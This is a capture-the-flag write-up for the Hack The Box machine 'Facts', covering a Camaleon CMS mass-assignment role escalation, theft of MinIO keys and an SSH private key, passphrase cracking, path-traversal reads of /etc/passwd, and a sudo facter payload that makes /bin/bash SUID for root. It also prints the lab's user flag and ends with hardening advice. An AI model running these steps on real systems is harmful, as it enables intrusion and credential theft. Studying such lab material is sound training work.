# Facts

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | Facts |
| Difficulty | Easy |
| Operating System | Linux |
| IP Address | 10.129.2.0 |

---

## Summary

> Facts is an Easy Linux machine from HackTheBox Season 10 running Camaleon CMS 2.9.0 on Nginx over Ruby on Rails. The attack chain starts with open user registration on the admin panel, followed by a mass-assignment privilege escalation (CVE-2025-2304) to gain admin access. As admin, AWS/MinIO S3 credentials exposed in the CMS settings allow enumeration of a self-hosted MinIO instance on port 54321, where an encrypted SSH private key is recovered from an internal bucket. After cracking the passphrase with John the Ripper, SSH access is gained as `trivia`. Finally, a `sudo` misconfiguration on `/usr/bin/facter` — a Ruby-based binary — allows arbitrary code execution as root via a custom fact directory, completing the privilege escalation chain.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Initial quick scan
nmap 10.129.2.0

# Detailed service/version/script scan
nmap -sV -sS -sC -p22,80 10.129.2.0 -vv -oN nmap/initial.txt

# Full port scan (reveals hidden port 54321)
nmap -p- --min-rate 5000 -T4 10.129.2.0 -oN nmap/full.txt
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http     nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  unknown  (MinIO S3 API)
```

### Open Ports

| Port | Protocol | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 |
| 80 | TCP | HTTP | nginx 1.26.3 (Ubuntu) — redirects to `facts.htb` |
| 54321 | TCP | MinIO S3 API | Self-hosted MinIO instance |

### Notes

> Port 80 redirects to `facts.htb` — add to `/etc/hosts`. Port 54321 is not initially obvious from a default scan; a full `-p-` scan is required to discover it. This port exposes a MinIO S3-compatible API endpoint that becomes critical later in the engagement.

---

## 2. Enumeration

### Web Enumeration

> Navigating to `http://facts.htb/` reveals a single-page animal facts site with a search feature. Requests are made via GET to `/search?q=<param>`. Wappalyzer identifies the stack as Ruby on Rails + Nginx + jQuery 2.2.4 + Bootstrap 3.4.1 + Modernizr.

```bash
# Add virtual host to /etc/hosts
echo "10.129.2.0    facts.htb" | sudo tee -a /etc/hosts

# Inspect response headers for CMS fingerprinting
curl -I "http://facts.htb/search?q=test"

# Directory brute-force
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302
# OR
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

> The response headers expose the session cookie name `_factsapp_session` and a theme asset path containing `camaleon_first`, identifying the CMS as **Camaleon CMS**. The asset link header references versioned CSS/JS bundles. Directory enumeration confirms an `/admin` endpoint redirecting to `/admin/login`.

```
Discovered: http://facts.htb/admin  →  http://facts.htb/admin/login
```

> The admin login page exposes a **public registration link** at `/admin/register`. Registering a new account grants "Client" role access to the admin dashboard — limited, but sufficient for exploitation.

---

### Other Services

> **MinIO S3 (port 54321)** — self-hosted S3-compatible object storage. Not accessible without credentials. Credentials are recovered later via the CMS admin panel.

```bash
# Searchsploit check for Camaleon
searchsploit camaleon
# Results:
# Camaleon CMS 2.4    - Cross-Site Scripting   | ruby/webapps/45592.txt
# Camaleon CMS v2.7.0 - Server-Side Template   | ruby/webapps/51489.txt
```

---

## 3. Foothold

### Vulnerability Identified

> **CVE-2025-2304 — Privilege Escalation via Mass Assignment (CVSS 9.4)**  
> Camaleon CMS 2.9.0's `/admin/users/<id>/updated_ajax` endpoint handles password update requests without filtering nested model attributes. By injecting `&password[role]=admin` into the POST request body, an authenticated "Client" user can escalate their own role to "Administrator" — bypassing all access controls.

### Exploitation

```bash
# 1. Register a new account at:
http://facts.htb/admin/register
# Use any credentials, e.g. username / Pswd342

# 2. Log in, navigate to profile → change password
# Intercept the POST request to /admin/users/<id>/updated_ajax with Burp Suite

# 3. Append the following parameter to the request body:
&password[role]=admin

# 4. Forward the modified request — server returns HTTP 200
# 5. Log out and log back in → role is now Administrator
```

> The POST body targets the `updated_ajax` endpoint and passes user attributes as nested parameters (`password[password]`, `password[password_confirmation]`). The backend fails to apply strong parameter filtering, allowing arbitrary model attributes such as `role` to be mass-assigned. Escalation is confirmed by the expanded admin interface on re-login.

### Shell Obtained

> No direct shell yet at this stage — admin panel access obtained. Foothold leads into credential harvesting → SSH access.

---

## 4. Lateral Movement

### Step 1 — Extract MinIO credentials from CMS settings

> With administrator access, navigating to **Settings → Configuration → Filesystem** reveals the S3/MinIO backend configuration, including plaintext AWS-style access keys:

```
Access Key ID:     AKIA5DD94C0804311000
Secret Access Key: q+BQYSRxbDATjWwr6fm18SLVZ5lcCDCcBrm55Yum
Endpoint:          http://facts.htb:54321
```

> Note: A second set of keys was found earlier via CVE-2024-46987 path traversal on `/etc/passwd` output (keys: `AKIA7A69363C0BD29E9E` / `ry/bKd9ycFEicrjCMPYupNfU8y+BIR7q+1SL8Ju4`), but the admin panel keys are the operative ones for S3 access.

```bash
# Configure AWS CLI profile with the recovered credentials
aws configure
# AWS Access Key ID:     AKIA5DD94C0804311000
# AWS Secret Access Key: q+BQYSRxbDATjWwr6fm18SLVZ5lcCDCcBrm55Yum
# Default region:        us-east-1
# Default output format: (leave blank)

# List available S3 buckets via custom MinIO endpoint
aws s3 ls --endpoint-url http://facts.htb:54321
# 2025-09-11 08:06:52 internal
# 2025-09-11 08:06:52 randomfacts

# Enumerate contents of the internal bucket
aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
# Reveals: .ssh/ directory, .bashrc, .profile, etc.

# Sync the .ssh directory locally
aws s3 sync s3://internal/.ssh ./ssh_loot --endpoint-url http://facts.htb:54321

# Retrieve the private key
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --endpoint-url http://facts.htb:54321
```

### Step 2 — Crack the SSH key passphrase

> The recovered `id_ed25519` key is encrypted. Crack the passphrase using `john`:

```bash
chmod 600 id_ed25519
ssh2john id_ed25519 > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked passphrase: dragonballz
```

### Step 3 — SSH login as `trivia`

> The key belongs to user `trivia` (confirmed from `/etc/passwd` via CVE-2024-46987 earlier):

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

> Shell access obtained as `trivia`. The user flag is located at `/home/william/user.txt` (readable by `trivia`).

---

### Alternative Path — CVE-2024-46987 (Path Traversal LFI)

> **CVE-2024-46987 — Authenticated Path Traversal in Camaleon CMS (CVSS 7.7)**  
> Affects Camaleon CMS 2.8.0–2.8.2, also functional on 2.9.0. The `download_private_file` method in `MediaController` does not sanitize the `file` parameter, allowing arbitrary file reads as the web user (`www-data`).

```bash
# Clone the PoC
git clone https://github.com/Goultarde/CVE-2024-46987

# Read /etc/passwd (reveals users trivia and william)
python3 CVE-2024-46987.py -u http://facts.htb -l username -p Pswd342 /etc/passwd | tail

# Read the user flag directly
python3 CVE-2024-46987.py -u http://facts.htb -l username -p Pswd342 /home/william/user.txt

# Read the SSH private key directly (bypasses MinIO entirely)
python3 CVE-2024-46987.py -u http://facts.htb -l username -p Pswd342 /home/trivia/.ssh/id_ed25519
```

> This path traversal bypasses the need for MinIO enumeration entirely. Both paths ultimately yield the same `id_ed25519` key for user `trivia`.

---

## 5. Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

```bash
# Inspect the binary
file /usr/bin/facter
# /usr/bin/facter: Ruby script, ASCII text executable

cat /usr/bin/facter
# #!/usr/bin/ruby
# frozen_string_literal: true
# require 'facter/framework/cli/cli_launcher'
# ...
```

> `facter` is a Ruby-based system information tool (part of Puppet ecosystem). It supports a `--custom-dir` flag that loads custom Ruby "fact" scripts from a specified directory and executes them. Since the binary runs as root via `sudo`, any Ruby code in the custom fact file executes with root privileges.

### Exploitation

```bash
# Create a writable exploit directory
mkdir -p /tmp/exploit_facts
cd /tmp/exploit_facts

# Write a malicious Ruby fact that sets the SUID bit on /bin/bash
cat > /tmp/exploit_facts/exploit.rb << 'EOF'
#!/usr/bin/env ruby
puts "custom_fact=exploited"
system("chmod +s /bin/bash")
EOF

# Execute facter with the custom directory as root
sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x
# Output: custom_fact=exploited

# Verify SUID bit was applied
ls -al /bin/bash
# -rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash

# Spawn a root shell
bash -p
```

### Root / Administrator Access

```bash
bash-5.2# whoami
root
bash-5.2# id
uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)
bash-5.2# cat /root/root.txt
<root flag here>
```

> Root access confirmed via `bash -p` (preserves effective UID = 0 due to SUID). Full filesystem access achieved.

---

## 6. Flags

| Flag | Value |
|---|---|
| User | a206f9e2d290a80ae3f17a37699e4133 |
| Root | (retrieve via `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - **Mass assignment** vulnerabilities in web frameworks are subtle but critical — always validate and whitelist accepted parameters on every endpoint, especially profile/update routes.
> - **Self-hosted cloud storage** (MinIO) configured within a CMS is a high-value target. Credentials stored in CMS settings are often exposed to any admin-level user — and getting admin can be easier than expected.
> - **CVE-2024-46987** demonstrates that even "authenticated-only" path traversal bugs are dangerous when combined with open registration or privilege escalation.
> - **ssh2john + rockyou** remains a reliable approach for cracking encrypted SSH keys found during engagements — always check passphrase strength.
> - **`facter --custom-dir`** is an excellent GTFOBins-style abuse vector for Ruby-based tools with sudo rights. Any binary that loads and executes user-supplied code as root is a privilege escalation path.
> - Running a full `-p-` nmap scan is essential — port 54321 (MinIO) would have been missed with a default scan, making the entire S3 path invisible.

---

## 8. Mitigation & Hardening

> - **CVE-2025-2304 (Mass Assignment)**: Apply strict parameter filtering (`strong_parameters` in Rails) on the `updated_ajax` endpoint. Explicitly permit only `password` and `password_confirmation` — never allow `role` or other model attributes to be set via user input.
> - **Open Registration**: Disable public registration on the `/admin/register` endpoint in production deployments. If registration is required, enforce email verification and role assignment by a separate admin.
> - **CVE-2024-46987 (Path Traversal)**: Upgrade Camaleon CMS to version ≥ 2.8.2. Sanitize and normalize all user-supplied file paths; reject sequences containing `..`. Restrict file-read operations to a defined base directory.
> - **MinIO credentials in CMS**: Never store cloud storage credentials in a CMS configuration accessible to admin-level users. Use IAM roles, environment variables, or secrets managers instead.
> - **S3 bucket permissions**: The `internal` bucket containing SSH keys should not be accessible via application-level credentials. Use separate IAM policies with least-privilege access and enforce bucket policies.
> - **sudo on facter**: Remove the NOPASSWD sudo rule for `/usr/bin/facter`. If system information collection is required, use a read-only wrapper script with tightly scoped permissions. Never grant sudo access to interpreter-based tools that accept arbitrary input paths.
> - **SSH key passphrase strength**: `dragonballz` is in `rockyou.txt`. Use strong, random passphrases for SSH keys. Consider hardware tokens (e.g., FIDO2/YubiKey) for key protection.

---

## References

- [CVE-2024-46987 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)
- [CVE-2024-46987 — PoC (GitHub)](https://github.com/Goultarde/CVE-2024-46987)
- [CVE-2025-2304 — Mass Assignment in Camaleon CMS (GitHub)](https://github.com/Alien0ne/CVE-2025-2304)
- [CVE-2025-2304 — RubySec Advisory](https://rubysec.com/advisories/CVE-2025-2304/)
- [Camaleon CMS GitHub](https://github.com/owen2345/camaleon-cms)
- [GTFOBins — Ruby](https://gtfobins.github.io/gtfobins/ruby/)
- [MinIO Documentation](https://min.io/docs/minio/linux/reference/minio-mc.html)
- [Facter — Puppet Docs](https://www.puppet.com/docs/facter/3.14/custom_facts.html)
